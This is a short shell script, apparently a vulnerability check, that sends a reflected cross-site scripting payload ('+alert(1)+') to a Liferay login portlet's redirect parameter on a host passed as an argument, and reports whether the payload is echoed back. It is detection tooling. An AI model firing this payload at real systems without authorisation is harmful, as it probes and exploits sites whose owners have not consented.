exitValue=1

VAR="$(curl --data-urlencode "p_p_id=com_liferay_login_web_portlet_LoginPortlet" --data-urlencode "p_p_state=maximized" --data-urlencode "_com_liferay_login_web_portlet_LoginPortlet_redirect='+alert(1)+'" -L -m 3 -s "http://$1/api//axis")"

if echo "$VAR" | grep -q '+alert(1)+'; then
    exitValue=0
fi

exit $exitValue